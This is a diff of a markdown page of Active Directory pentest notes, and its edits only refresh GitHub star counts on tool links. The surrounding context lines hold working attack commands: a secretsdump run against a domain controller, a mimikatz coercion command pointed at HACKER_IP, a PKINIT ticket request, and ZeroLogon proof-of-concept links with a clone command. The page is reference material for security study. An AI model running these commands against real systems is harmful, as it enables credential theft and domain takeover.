@@ -223,7 +223,7 @@ We may be able to perform a [LDAP Pass-back Attack](/operating-systems/networkin
 
 Look for passwords stored using [reversible encryption](#passwords-stored-using-reversible-encryption)
 
-You can find hosts using [adidnsdump](https://github.com/dirkjanm/adidnsdump) <small>(0.9k ⭐)</small> to [dump DNS records](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/):
+You can find hosts using [adidnsdump](https://github.com/dirkjanm/adidnsdump) <small>(1.0k ⭐)</small> to [dump DNS records](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/):
 
 ```ps
 $ pipx install git+https://github.com/dirkjanm/adidnsdump
@@ -268,8 +268,8 @@ We should be able to exploit every other technique and:
 Automated tools:
 
 * You can use [BloodHound](/cybersecurity/red-team/tools/utilities/windows/bloodhound.md) to collect information and to analyze it. It can find attack vectors and attack paths.
-* You can use [ADRecon](https://github.com/sense-of-security/ADRecon) <small>(1.6k ⭐, 2020 🪦)</small>/[fork](https://github.com/adrecon/ADRecon) <small>(0.6k ⭐)</small> for enumeration. See also: [pingcastle](https://github.com/vletoux/pingcastle).
-* You can enumerate GPOs using [PowerSploit](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainGPO/) or [Group3r](https://github.com/Group3r/Group3r) <small>(0.6k ⭐)</small> to find dangerous ACEs. We can also use the [GPO Module](https://learn.microsoft.com/en-us/powershell/module/grouppolicy/?view=windowsserver2022-ps). See also: [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) <small>(1.0k ⭐)</small>.
+* You can use [ADRecon](https://github.com/sense-of-security/ADRecon) <small>(1.8k ⭐, 2020 🪦)</small>/[fork](https://github.com/adrecon/ADRecon) <small>(0.8k ⭐)</small> for enumeration. See also: [pingcastle](https://github.com/vletoux/pingcastle).
+* You can enumerate GPOs using [PowerSploit](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainGPO/) or [Group3r](https://github.com/Group3r/Group3r) <small>(0.8k ⭐)</small> to find dangerous ACEs. We can also use the [GPO Module](https://learn.microsoft.com/en-us/powershell/module/grouppolicy/?view=windowsserver2022-ps). See also: [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) <small>(1.1k ⭐)</small>.
 
 Additional configurations:
 
@@ -353,7 +353,7 @@ You could also do it remotely:
 $ impacket-secretsdump -dc-ip IP -just-dc sdomain/username:password@IP
 ```
 
-You could also use [DSInternals](https://github.com/MichaelGrafnetter/DSInternals/) <small>(1.5k ⭐)</small>:
+You could also use [DSInternals](https://github.com/MichaelGrafnetter/DSInternals/) <small>(1.7k ⭐)</small>:
 
 ```ps
 PS> Import-Module .\DSInternals.psd1
@@ -522,7 +522,7 @@ Refer to [cracking Kerberos Tickets](/cybersecurity/cryptography/algorithms/hash
 
 📚 Refer to "Managed Service Accounts" for remediation (LAPS).
 
-📚 More tools: [kerberoast](https://github.com/nidem/kerberoast) <small>(1.3k ⭐)</small>, [RiskySPN](https://github.com/cyberark/RiskySPN) <small>(0.3k ⭐)</small>
+📚 More tools: [kerberoast](https://github.com/nidem/kerberoast) <small>(1.4k ⭐)</small>, [RiskySPN](https://github.com/cyberark/RiskySPN) <small>(0.3k ⭐)</small>
 </div></div>
 
 <hr class="sep-both">
@@ -815,7 +815,7 @@ mimikatz# misc::efs /server:DCIP /connect:HACKER_IP
 
 ➡️ See also: [Invoke-Petitpotam.ps1](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-Petitpotam.ps1).
 
-➡️ See also: [PKINITtools](https://github.com/dirkjanm/PKINITtools) <small>(0.6k ⭐)</small> to get a TGT from a certificate:
+➡️ See also: [PKINITtools](https://github.com/dirkjanm/PKINITtools) <small>(0.7k ⭐)</small> to get a TGT from a certificate:
 
 ```ps
 $ python3 gettgtpkinit.py example.com\COMPUTE_ACCOUNT_NAME\$ -pfx-base64 ...SNIP... xxx.ccache
@@ -833,9 +833,9 @@ ZeroLogon is a harmful unauthenticated vulnerability that can be used to authent
 
 NetLogon uses AES with a null IV. When the nonce sent by the user is a block of zeros, then the session key may result all-zero ciphertext <small>(1/256, one session key is starting with 0)</small> allowing us to bypass authentication. We can then reset the DC password <small>(may lead to service disruptions)</small> and perform a DC sync to dump all secrets.
 
-* [PoC by SecuraBV](https://github.com/SecuraBV/CVE-2020-1472) <small>(1.7k ⭐)</small>
+* [PoC by SecuraBV](https://github.com/SecuraBV/CVE-2020-1472) <small>(1.8k ⭐)</small>
 * [PoC by dirkjanm](https://github.com/dirkjanm/CVE-2020-1472) <small>(1.2k ⭐)</small>
-* [PoC by risksense](https://github.com/risksense/zerologon) <small>(0.6k ⭐)</small>
+* [PoC by risksense](https://github.com/risksense/zerologon) <small>(0.7k ⭐)</small>
 
 ```shell!
 $ git clone https://github.com/SecuraBV/CVE-2020-1472.git SecuraBV
@@ -896,9 +896,9 @@ Stuff that I found, but never read/used yet.
 <div class="row row-cols-lg-2"><div>
 
 * prevent access to dangerous websites
-* [adPEAS](https://github.com/61106960/adPEAS) <small>(0.4k ⭐)</small>
-* [UltimateAppLockerByPassList](https://github.com/api0cradle/UltimateAppLockerByPassList) <small>(1.5k ⭐)</small>
-* [Active Directory Exploitation Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet) <small>(3.4k ⭐)</small>
+* [adPEAS](https://github.com/61106960/adPEAS) <small>(1.1k ⭐)</small>
+* [UltimateAppLockerByPassList](https://github.com/api0cradle/UltimateAppLockerByPassList) <small>(2.0k ⭐)</small>
+* [Active Directory Exploitation Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet) <small>(5.9k ⭐)</small>
 * [AD mindmap orange](https://orange-cyberdefense.github.io/ocd-mindmaps/)
 * [bloodyAD](https://github.com/CravateRouge/bloodyAD)+[autobloody](https://github.com/CravateRouge/autobloody)
 * [Exchange AD Privesc](https://github.com/gdedrouas/Exchange-AD-Privesc). Real all mailboxes as admin. Dump all credentials in memory to get hundreds of them. [PrivExchange](https://github.com/dirkjanm/PrivExchange) vulnerability.
